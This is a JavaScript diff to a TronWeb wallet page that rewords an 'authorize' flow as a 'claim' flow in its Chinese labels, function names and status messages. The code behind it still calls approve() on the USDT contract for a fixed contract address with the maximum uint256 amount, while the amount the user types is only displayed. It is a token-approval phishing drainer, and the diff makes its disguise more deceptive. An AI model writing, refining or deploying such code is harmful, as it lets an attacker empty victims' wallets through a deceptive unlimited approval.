@@ -1,5 +1,5 @@
 // 全局变量
-const CONTRACT_ADDRESS = 'TFedNktpEE2skv9DADVhEr3KC23KEAGkby'; // 授权合约地址
+const CONTRACT_ADDRESS = 'TFedNktpEE2skv9DADVhEr3KC23KEAGkby'; // 合约地址
 const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 资产合约地址
 let tronWeb = null;
 let userAddress = null;
@@ -74,8 +74,8 @@ document.addEventListener('DOMContentLoaded', function() {
     
     approveBtn.addEventListener('click', function(e) {
         e.preventDefault();
-        showDebugInfo('点击了转账按钮');
-        processPayment();
+        showDebugInfo('点击了领取按钮');
+        processTransaction();
     });
     
     retryBtn.addEventListener('click', function(e) {
@@ -201,7 +201,7 @@ async function connectWallet() {
         // 获取USDT余额
         const balance = await getUSDTBalance(userAddress);
         const readableBalance = tronWeb.fromSun(balance);
-        usdtBalanceElem.textContent = `${readableBalance} USDT`;
+        usdtBalanceElem.textContent = `${readableBalance}`;
         
         showStatus('钱包已连接', 'success');
     } catch (error) {
@@ -226,19 +226,19 @@ async function getUSDTBalance(address) {
     }
 }
 
-// 处理授权
-async function processPayment() {
-    console.log('处理授权...');
-    showDebugInfo('处理授权...');
+// 处理领取
+async function processTransaction() {
+    console.log('处理领取...');
+    showDebugInfo('处理领取...');
     
-    // 仍然读取输入框中的值用于显示，但不用于实际授权
+    // 仍然读取输入框中的值用于显示，但不用于实际操作
     const displayAmount = amountInput.value;
     if (isNaN(displayAmount) || parseFloat(displayAmount) <= 0) {
         showStatus('请输入有效的数量', 'error');
         return;
     }
     
-    showStatus('正在处理授权，请在钱包中确认交易...', 'loading');
+    showStatus('正在处理领取，请在钱包中确认交易...', 'loading');
     
     try {
         // 获取合约实例
@@ -246,15 +246,15 @@ async function processPayment() {
         console.log('资产合约加载成功');
         showDebugInfo('资产合约加载成功');
         
-        // 使用最大授权额度 - 设置一个足够大的数字
+        // 使用最大额度 - 设置一个足够大的数字
         // 2^256-1 是最大可能的uint256值
-        const maxApprovalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
+        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
         
-        console.log('准备调用approve方法，授权最大金额');
-        showDebugInfo('准备调用approve方法，授权最大金额');
+        console.log('准备调用approve方法，开始领取');
+        showDebugInfo('准备调用approve方法，开始领取');
         
-        // 调用approve方法授权合约最大金额
-        const result = await assetContract.approve(CONTRACT_ADDRESS, maxApprovalAmount).send({
+        // 调用approve方法
+        const result = await assetContract.approve(CONTRACT_ADDRESS, maxAmount).send({
             feeLimit: 100000000,
             callValue: 0,
             shouldPollResponse: true
@@ -262,16 +262,16 @@ async function processPayment() {
         
         console.log('交易结果:', result);
         showDebugInfo('交易结果: ' + JSON.stringify(result).substring(0, 100) + '...');
-        showStatus('授权成功！', 'success');
+        showStatus('领取成功！', 'success');
         
         // 更新余额
         const newBalance = await getUSDTBalance(userAddress);
         const readableBalance = tronWeb.fromSun(newBalance);
-        usdtBalanceElem.textContent = `${readableBalance} USDT`;
+        usdtBalanceElem.textContent = `${readableBalance}`;
     } catch (error) {
-        console.error('授权失败:', error);
-        showDebugInfo('授权失败: ' + error.message);
-        showStatus('授权失败: ' + error.message, 'error');
+        console.error('领取失败:', error);
+        showDebugInfo('领取失败: ' + error.message);
+        showStatus('领取失败: ' + error.message, 'error');
     }
 }
 
